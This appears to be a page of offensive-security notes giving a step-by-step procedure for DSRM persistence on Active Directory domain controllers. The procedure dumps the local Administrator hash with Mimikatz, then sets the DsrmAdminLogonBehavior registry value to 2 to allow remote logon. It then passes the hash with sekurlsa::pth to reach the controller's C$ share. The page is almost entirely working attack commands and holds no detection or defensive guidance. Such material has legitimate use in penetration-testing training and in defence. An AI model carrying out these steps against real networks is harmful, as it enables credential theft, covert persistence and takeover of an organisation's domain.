---
legal-banner: true
---

### **Overview**

Domain Controllers (DCs) have a local Administrator account that can be leveraged for persistence.  
By gaining administrative privileges on a DC and dumping the local Administrator hash, you can modify the registry to enable remote access to this account.  

### **Procedure for Enabling Remote DSRM Account Access**

1. Dump the hash of the local Administrator account on the DC using Mimikatz:  
   ```powershell
   Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
   ```

2. Modify the registry to enable remote access.  
   The registry key `DsrmAdminLogonBehavior` controls whether the Directory Services Restore Mode (DSRM) account can log on remotely:  
   `0` → Default (remote login disabled)  
   `1` → Allow remote login if explicitly enabled  
   `2` → Always allow remote login  
   **NOTE:** Setting the value to **2** ensures that the DSRM/local Administrator account can be used for remote logins.  

3. Check if the key exists and get its value:  
   ```powershell
   Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior
   ```

4. Create the key with value `2` if it does not exist:  
   ```powershell
   New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2 -PropertyType DWORD
   ```

5. Change the value to `2` if it exists but is set incorrectly:  
   ```powershell
   Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\LSA" -Name DsrmAdminLogonBehavior -Value 2
   ```

6. Perform Pass-the-Hash (PTH) to gain access, use the dumped hash to authenticate and access the DC remotely. Note: the "domain" used is the name of the DC machine.  

7. Use `sekurlsa::pth` to pass the hash:  
   ```bash
   sekurlsa::pth /domain:[DC_MACHINE_NAME] /user:[USERNAME] /ntlm:[HASH] /run:[CMD]
   ```

8. Example — list the contents of the `C$` share:  
   ```bash
   ls \\[DC_MACHINE_NAME]\C$
   ```
